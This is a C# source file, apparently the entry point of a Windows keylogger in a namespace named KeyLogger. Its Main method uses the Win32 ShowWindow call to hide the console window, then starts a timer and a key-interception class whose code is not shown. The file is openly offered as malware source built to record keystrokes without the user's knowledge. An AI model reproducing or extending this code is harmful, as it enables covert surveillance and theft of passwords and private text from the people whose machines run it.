using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;


namespace KeyLogger
{
    class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int SW_Min = 2;
        const int SW_Max = 3;
        const int SW_Norm = 4;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [MTAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            
            ShowWindow(handle, SW_HIDE);//Hide console

            //ShowWindow(handle, SW_SHOW);//Show console


            //Console.WriteLine("Press enter...");

            Data.InitializeTimer();
            InterceptKeys keys = new InterceptKeys();
            

            Console.ReadKey();
        }

    }
}
